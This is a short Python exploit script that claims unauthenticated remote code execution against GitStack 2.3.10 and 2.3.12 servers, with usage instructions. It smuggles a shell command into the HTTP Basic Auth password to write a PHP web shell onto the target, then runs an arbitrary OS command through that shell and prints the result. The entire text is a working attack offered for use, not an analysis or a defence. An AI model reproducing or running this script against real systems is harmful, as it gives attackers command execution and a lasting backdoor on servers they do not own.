#!/usr/bin/python3

import requests
from requests.auth import HTTPBasicAuth
import os
import sys

print("GitStack Unauthenticated RCE")
print("Versione Affected: 2.3.10 & 2.3.12")
print("https://gitstack.com/")
print("Author: Mikael")
print("")
print("USE - ./GitStack_RCE.py [IP/HOSTNAME] [VALID EXISTING REPOSITORY] [VALID EXISTING USER] [OS-CMD]")
print("EX - ./GitStack_RCE.py git-server.local test admin whoami")
print("")

ip = sys.argv[1]
repository = sys.argv[2]
username = sys.argv[3]
command = sys.argv[4]

print("[+] Create backdoor in PHP on target:", ip)
request_1 = requests.get('http://{}/web/index.php?p={}.git&a=summary'.format(ip, repository), auth=HTTPBasicAuth(username, 'c && echo "<?php echo shell_exec($_GET[\'cmd\']); ?>" > c:\GitStack\gitphp\webshell.php'))
print((request_1.text.encode(sys.stdout.encoding, errors='replace')))
print("[+] Done")
# PAYLOAD TO USE, ENCODED IN BASE64
print("")
print("[+] Execute command:", command)
request_2 = requests.get("http://{}/web/webshell.php?cmd=" .format(ip) + command)
print("")
print((request_2.text))
print(("[+] To use the webshell, go to: http://"+ip+"/web/webshell.php?cmd=" + command))
